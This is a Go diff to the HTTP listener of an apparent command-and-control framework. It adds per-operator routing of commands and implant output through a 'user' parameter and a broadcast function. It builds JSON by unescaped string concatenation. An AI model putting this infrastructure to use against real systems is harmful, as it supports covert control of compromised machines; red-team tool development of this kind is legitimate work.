@@ -52,6 +52,8 @@ func HTTPServerHandler(w http.ResponseWriter, r *http.Request) {
 //
 // AdditionalFunctions - additional function names that can be registered to a given session. These contain a JSON string of {"name":"description"} that is loaded into the CLI if successfully registered. Users can then execute these as unique session sub-commands. It is assumed that the implant has implemented these functions and will execute reserved actions once the registered keyword is received.
 //
+// Username - a username provided so the handler knows who the request is destined for, defaults to "server" if the implant does not specify in the request.
+//
 // Register - a boolean value that lets a listener know if an implant is attempting to register itself or not. If not provided registration is assumed to be false. If registration is attempted the listener will check for valid authentication via the PSK and attempt to register a new session.
 
 func handleGetRequests(w http.ResponseWriter, r *http.Request) {
@@ -66,6 +68,7 @@ func handleGetRequests(w http.ResponseWriter, r *http.Request) {
 	var getData string
 	var getAdditionalFunctions string
 	var additionalFunctions map[string]interface{}
+	var getUsername string
 	register := false
 	var err error
 
@@ -153,6 +156,12 @@ func handleGetRequests(w http.ResponseWriter, r *http.Request) {
 		additionalFunctions = nil
 	}
 
+	if len(getParams["user"]) > 0 {
+		getUsername = getParams["user"][0]
+	} else {
+		getUsername = "server"
+	}
+
 	if getPSK == PSK {
 
 		if register == true {
@@ -193,17 +202,26 @@ func handleGetRequests(w http.ResponseWriter, r *http.Request) {
 
 	if getData != "" {
 		core.LogData("Session " + strconv.Itoa(getSessionID) + " returned:\n" + getData)
-		fmt.Println("\nSession " + strconv.Itoa(getSessionID) + " returned:\n" + getData)
+		if getUsername == "server" {
+			fmt.Println("\nSession " + strconv.Itoa(getSessionID) + " returned:\n" + getData)
+		} else {
+			currentWolf := core.Wolves[getUsername]
+			jsonData := `{"data":"` + getData + `"}`
+			core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
+		}
 	}
 
 	var cmd string
+	var user string
 
 	if core.Sessions[getSessionID].Implant.Commands != nil {
-		cmd = core.Sessions[getSessionID].Implant.Commands[0]
+		cmd = core.Sessions[getSessionID].Implant.Commands[0].Command
+		user = core.Sessions[getSessionID].Implant.Commands[0].Operator
 	}
 
 	response := map[string]interface{}{
-		"cmd": cmd,
+		"user": user,
+		"cmd":  cmd,
 	}
 
 	json.NewEncoder(w).Encode(response)
@@ -233,6 +251,8 @@ func handleGetRequests(w http.ResponseWriter, r *http.Request) {
 //
 // AdditionalFunctions - additional function names that can be registered to a given session. These contain a JSON string of {"name":"description"} that is loaded into the CLI if successfully registered. Users can then execute these as unique session sub-commands. It is assumed that the implant has implemented these functions and will execute reserved actions once the registered keyword is received.
 //
+// Username - a username provided so the handler knows who the request is destined for, defaults to "server" if the implant does not specify in the request.
+//
 // Register - a boolean value that lets a listener know if an implant is attempting to register itself or not. If not provided registration is assumed to be false. If registration is attempted the listener will check for valid authentication via the PSK and attempt to register a new session.
 
 func handlePostRequests(w http.ResponseWriter, r *http.Request) {
@@ -247,6 +267,7 @@ func handlePostRequests(w http.ResponseWriter, r *http.Request) {
 	var postData string
 	var postAdditionalFunctions string
 	var additionalFunctions map[string]interface{}
+	var postUsername string
 	register := false
 	var err error
 
@@ -333,6 +354,12 @@ func handlePostRequests(w http.ResponseWriter, r *http.Request) {
 		postAdditionalFunctions = ""
 	}
 
+	if len(postParams["user"]) > 0 {
+		postUsername = postParams["user"][0]
+	} else {
+		postUsername = "server"
+	}
+
 	if postPSK == PSK {
 
 		if register == true {
@@ -373,17 +400,26 @@ func handlePostRequests(w http.ResponseWriter, r *http.Request) {
 
 	if postData != "" {
 		core.LogData("Session " + strconv.Itoa(postSessionID) + " returned:\n" + postData)
-		fmt.Println("\nSession " + strconv.Itoa(postSessionID) + " returned:\n" + postData)
+		if postUsername == "server" {
+			fmt.Println("\nSession " + strconv.Itoa(postSessionID) + " returned:\n" + postData)
+		} else {
+			currentWolf := core.Wolves[postUsername]
+			jsonData := `{"data":"` + postData + `"}`
+			core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
+		}
 	}
 
 	var cmd string
+	var user string
 
 	if core.Sessions[postSessionID].Implant.Commands != nil {
-		cmd = core.Sessions[postSessionID].Implant.Commands[0]
+		cmd = core.Sessions[postSessionID].Implant.Commands[0].Command
+		user = core.Sessions[postSessionID].Implant.Commands[0].Operator
 	}
 
 	response := map[string]interface{}{
-		"cmd": cmd,
+		"user": user,
+		"cmd":  cmd,
 	}
 
 	json.NewEncoder(w).Encode(response)
